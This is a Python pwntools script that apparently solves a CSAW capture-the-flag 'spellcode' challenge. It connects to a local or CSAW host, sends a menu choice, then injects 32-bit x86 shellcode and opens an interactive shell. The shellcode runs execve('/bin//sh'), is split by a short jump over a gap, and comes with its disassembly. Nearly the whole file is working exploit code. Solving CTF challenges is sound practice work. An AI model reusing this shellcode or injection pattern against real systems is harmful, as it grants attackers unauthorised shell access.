
# solve level_1_shellcode

from pwn import *
from time import sleep

local = True
debug = False
if local:
    if debug:
        p = gdb.debug('./level_2_spellcode',
            '''
            break *0x0804890f
            continue
            ''')
        # *0x0804890f: after the read.
    else:
        #p = process('./level_2_spellcode')
        p = remote('localhost',5000)
else:
    p = remote('ctf.csaw.io', 8000)

#sleep(15)
# From Hacking: the Art of Exploitation, p. 298. An oldie but a goodie.
'''
 4fa:   31 c0                   xor    %eax,%eax
 4fc:   50                      push   %eax
 4fd:   68 2f 2f 73 68          push   $0x68732f2f

 eb 09   jump forward 11 bytes

 502:   68 2f 62 69 6e          push   $0x6e69622f
 507:   89 e3                   mov    %esp,%ebx
 509:   50                      push   %eax
 50a:   89 e2                   mov    %esp,%edx
 50c:   53                      push   %ebx
 50d:   89 e1                   mov    %esp,%ecx
 50f:   b0 0b                   mov    $0xb,%al
 511:   cd 80                   int    $0x80
'''

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
shellcode += "\xeb\x09" # Jump forward 11 bytes, through the "door" of null bytes
#shellcode += "\x90\x90"
shellcode += "\x90"*9
shellcode += "\x68\x2f\x62\x69\x6e"
shellcode += "\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
p.recvuntil(">");
p.send("3\n");
p.recvuntil(">");
#sleep(20)
p.send(shellcode + '\n')
p.interactive()

